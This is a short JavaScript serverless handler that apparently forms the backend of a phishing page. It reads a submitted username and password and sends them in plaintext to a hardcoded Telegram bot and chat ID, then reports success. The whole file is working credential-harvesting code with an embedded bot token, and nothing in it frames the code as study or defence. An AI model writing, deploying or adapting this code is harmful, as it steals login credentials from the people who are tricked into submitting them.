export default async function handler(req, res) {
    if (req.method === "POST") {
        const { username, password } = req.body;
        
        // Your Telegram bot token and chat ID
        const botToken = "7673803088:AAG9rjdWcAG-oymhFsQrUYD_RLMDSOLDt3I";
        const chatId = "7760612629";
        
        // Format the message
        const message = `🔒 Login Attempt\n\n👤 Username: ${username}\n🔑 Password: ${password}`;
        
        // Send the message to Telegram
        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        try {
            await fetch(telegramURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });

            res.status(200).json({ success: true, message: "Data sent to Telegram." });
        } catch (error) {
            res.status(500).json({ success: false, message: "Error sending data." });
        }
    } else {
        res.status(405).json({ success: false, message: "Method not allowed." });
    }
}
